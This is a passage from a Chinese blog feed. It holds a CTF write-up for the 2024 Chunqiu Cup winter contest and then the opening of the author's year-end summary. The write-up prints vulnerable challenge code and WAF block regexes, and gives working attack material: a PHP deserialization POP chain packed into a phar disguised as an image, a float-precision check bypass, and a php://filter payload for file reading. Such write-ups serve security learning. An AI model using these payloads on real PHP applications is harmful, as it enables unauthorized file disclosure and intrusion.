<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>";</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>白名单，结合题目描述可知要用phar打</p><p>看一下利用类：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>链子：<code>Chunqiu::__destruct -&gt; Show::__toString -&gt; Test::__get -&gt; Test::get -&gt; Test::file_get</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119114348505.png" alt="image-20250119114348505"></p><p>接下来构造phar包</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token comment">// echo serialize($a);</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改为png后缀，上传</p><p>然后上传后的文件名是<code>md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;</code></p><p>结果这个<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>整了半天也没搞清楚路径在哪</p><p>file.php 可以直接读文件，waf屁用没有，<code>/file.php?file=/flag</code>非预期秒了，phar个锤子</p><hr><h1 id="easy-code"><a href="#easy-code" class="headerlink" title="easy_code"></a>easy_code</h1><p>基于get请求参数的2048</p><p>robots.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: chunqiuDisallow: /gogogo.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>gogogo.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allowedFiles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'read.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ctfer</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfer'</span><span class="token punctuation">]</span><span class="token operator">??</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token operator">!=</span> <span class="token number">667</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//溢出</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'7'</span><span class="token punctuation">)</span><span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 3!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 改进的正则表达式，检查是否不存在 base|rot13|input|data|flag|file|base64 字符串</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^(?:.*(?:base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env).*)$/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 先检查文件是否在允许的列表中</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"prohibited prohibited!!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"试试read.php"</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求 ctfer 的值为667，<code>strval</code>取字符串，<code>strpos</code>返回出现的位置，即 strval 后不能出现7</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119122729696.png" alt="image-20250119122729696"></p><p>那么只有利用溢出才能绕过第三个判断，我们知道<code>intval</code>是存在溢出的，而 strval 的作用和 intval 类似</p><p>测试发现到 <code>666.99999999999999</code> 和 667 相等，通过第二个判断了，处理14位</p><p>而 <code>666.999999999999</code> 在 strval 后就是 667，处理12位</p><p>打远程的时候发现这样就绕过了，接下来就是读文件</p><p>找个能用的过滤器秒了<code>php://filter/convert.iconv.CP9066.CSUCS4/resource=read.php</code></p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119132840271.png" alt="image-20250119132840271"></p><hr><h1 id="FlagBot（Unsolved）"><a href="#FlagBot（Unsolved）" class="headerlink" title="FlagBot（Unsolved）"></a>FlagBot（Unsolved）</h1><p>抓包，随便改下signature参数值，然后发过去弹debug报错界面</p><p>泄露出app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        image_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'signature'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> image_data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"No signature provided!"</span><span class="token punctuation">,</span> <span class="token number">400</span>        image_data <span class="token operator">=</span> image_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> pred<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>image_data<span class="token punctuation">)</span><span class="token punctuation">,</span> model_path<span class="token operator">=</span><span class="token string">'/app/model_AlexNet.pth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测，真要打大模型样本对抗啊，搜了一下感觉都是论文</p><p>总之先访问路径获取 model_AlexNet.pth</p><p>不懂</p><hr><h1 id="ezUpload（Unsolved）"><a href="#ezUpload（Unsolved）" class="headerlink" title="ezUpload（Unsolved）"></a>ezUpload（Unsolved）</h1><p>上传文件加密，把加密的结果拿来解密会执行pickle</p><p>测试发现ban的是字母：R，o，i，b，字母删光了我打什么啊</p><p>摆明了不给命令执行</p><p>能用的：eval，setstate，exec，template，render，requests，class，flask，sys</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你什么比赛你撞西湖论剑（&lt;/p&gt;
&lt;p&gt;day2的题没做，放着不管！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/10/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-10T15:19:30.000Z</published>
    <updated>2025-01-13T16:37:56.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结束了各科期末考，放寒假了终于有时间能写写年终总结了</p><p>过去的一年经历了很多事情，转眼间大三一学期就过去了，很多事情都发生了改变</p><p>托NISA各位的福，去了很多地方打了许多比赛，让机场成为我这个废宅最熟悉的地方（</p><span id="more"></span><hr><h1 id="6-8月"><a href="#6-8月" class="headerlink" title="6-8月"></a>6-8月</h1><p>上一篇 Thinking 写出来的时候处于一种要学业没学业要技术没技术要输出没输出要时间没时间的状态，自我内耗了相当一段时间</p><p>暑假 hw 的计划在过了几次笔试后没等来面试之后打水漂了，于是就待在家里摆烂，那段时间唯一要做的事就是准备CISCN决赛，而黑盾杯则因为初赛没队友做其他方向于是寄了让出机会给小登（我也想吃汉堡qaq</p><p>不得不说有 CISCN 这样一个比赛的压力在前头，总能推着去主动找一些东西来学，即使在java这里已经远远落后于其他师傅一大截，但是也只有行动才能够改变这样的现状</p><p>于是从放寒假到比赛前的日子对着 drun1baby 的博客补全了一些我觉得容易学的 java 内容，也是耐心把 springboot 的基础给啃了下来（学 springboot 对下个学期的区块链实训也帮上了忙）</p><p>决赛之前打了春秋杯夏季赛和西瓜杯，成绩和比赛手感都还挺好的，也是上手了一下 i 春秋的 awdp 模式提前有了了解</p><p>然后决赛就是队友们各显神通，我也没有拖后腿，虽然有一点小遗憾没能拿到国一，但是也是创造了记录</p><br><p>打完ciscn回来之后我就进入了休眠期，每天打打游戏就过去了</p><p>八月份就只学了一个flask内存马，不过在玩了几个星期后心态也是放平了不少</p><p>然后巅峰极客<del>（web杯）</del>自己单c拍断大腿差一点进决赛，我的主办方报销四川游😭</p><p>nepctf混了个三血也就只出了这一道题，dasctf八月赛也只签了个到</p><p>月底又给自己上强度了，羊城杯+攻防演练+高数下补考（</p><p>最后高数也是过了，大二下喜提无挂科记录，可喜可贺可喜可贺</p><hr><h1 id="⑨月"><a href="#⑨月" class="headerlink" title="⑨月"></a>⑨月</h1><p>打完攻防演练和羊城杯初赛之后，巨魔希望我接下来能研究 java，即使协会里没有web前辈能走到这一步，那么我就来成为第一个吧</p><p>于是开始踏踏实实过cc链的进度，开学没啥事一天一条学过去，逐渐有了一点学java的感觉，于是java进度推了不少</p><p>然后呢是羊城杯决赛，给高端口卡了一早上我是没想到的，我搁这审了一早上的tp源码，最后只能说是输给了时间不足</p><p>接下来就是这学期里最有成就感的一次比赛——SCTF，在没有任何队友仅凭一己之力的情况下解出题目并拿下了三血，xctf并非不可战胜</p><hr><h1 id="10月"><a href="#10月" class="headerlink" 